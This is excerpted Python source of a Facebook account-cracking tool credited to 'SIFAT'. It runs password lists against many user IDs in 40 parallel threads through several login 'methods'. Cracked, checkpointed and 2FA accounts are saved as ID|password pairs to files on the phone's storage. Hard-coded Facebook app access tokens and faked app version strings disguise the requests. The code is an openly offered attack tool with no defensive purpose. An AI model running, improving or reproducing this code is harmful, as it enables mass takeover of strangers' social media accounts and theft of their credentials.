...
╚═════╝░╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
\033[1;36m============================================
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mIT'S ME \033[1;36m&& \033[1;32mSIFAT
...
def channal():
	clear()
	print(logo)
	print('  \033[1;92m[\033[1;93m1\033[1;92m] \033[1;93m follow my fb Id')
	...
	if aaa =='1':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100075538218986&mibextid=ZbWKwL');fia()
	if aaa =='2':
		exit()
...
def fia():
			...
			#clear();print(" \033[1;92m  \n\n\tFollow My Github For More Command");os.system('xdg-open https://github.com/SIFAT-ZX');time.sleep(5)
...
def rdx1():
				...
				with tred(max_workers=40) as SHAZIAS:	 
						...
						for psx in user:
								...
								SHAZIAS.submit(KKK1,ids,passlist)
...
def choice():
    ...
    print('IDs Saved In SIFAT-OK.txt, SIFAT-CP.txt')
    print('\033[1;36m============================================')
    fia()
...
def method1(ids,names,passlist,total_ids):
	...
	rr = ['\033[1;32m m1']
	whi = '\033[0;97m'
	sys.stdout.write('\r  [SIFAT-M1] %s/%s OK/CP/2F : %s/%s/%s        \r'%(loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		...
		for fikr in passlist:
			...
			if 'access_token' in po:
				print('   \033[1;32m[SIFAT-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				...
				print('\033[1;36m   [SIFAT-2F] '+ids+' | '+pas+            '\033[0;97m')
				
				tf.append(ids)
				open('/sdcard/SIFAT-2F.txt','a').write(ids+' | '+pas+'\n')
				break
			elif 'www.facebook.com' in str(po):
				print('   \033[1;91m[SIFAT-CP] '+ids+' | '+pas+            '\033[0;97m')
...
def method2(ids,names,passlist,total_ids):
	...
	rr = ['\033[1;32m m1']
	whi = '\033[0;97m'
	sys.stdout.write('\r  [SIFAT-M2] %s/%s OK/CP/2F : %s/%s/%s         \r'%(loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
...
def method3(ids,names,passlist,total_ids):
	...
	rr = ['\033[1;32m m2']
	whi = '\033[0;97m'
	sys.stdout.write('\r  [SIFAT-M3] %s/%s OK/CP/2F : %s/%s/%s         \r'%(loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		...
		for fikr in passlist:
			...
			po = requests.post(url,data=data,headers=headers).json()
			if 'access_token' in po:
				print('   \033[1;32m[SHAZIA-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				open('/sdcard/SHAZIA-OK.txt','a').write(ids+' | '+pas+'\n')
				...
				for pas in passlist:
						...
						if 'session_key' in po:
								...
								if str(uid) in oks:
										...
										print('\033[1;92m[SIFAT-OK] '+str(uid)+' | '+pas+             '\033[1;97m')
										
										open('/sdcard/SIFAT-OK.txt','a').write(str(uid)+'|'+pas+'\n')
										oks.append(str(uid))
								...
								if uid in oks:pass
										...
										print('\033[1;91m[SIFAT-CP] '+str(uid)+' | '+pas+         '\033[1;97m')
										
										open('/sdcard/SIFAT-CP.txt','a').write(str(uid)+'|'+pas+'\n')
										cps.append(str(ids))
										break										
						else:continue
				loop+=1
...
def KKK2(ids,passlist):
		...
		global oks
		global tl
		sys.stdout.write('\r\r\033[1;37m[SIFAT] %s/\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		try:
				for pas in passlist:
						accessToken = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28','350685531728|62f8ce9f74b12f84c123cc23437a4a32','6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
						fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
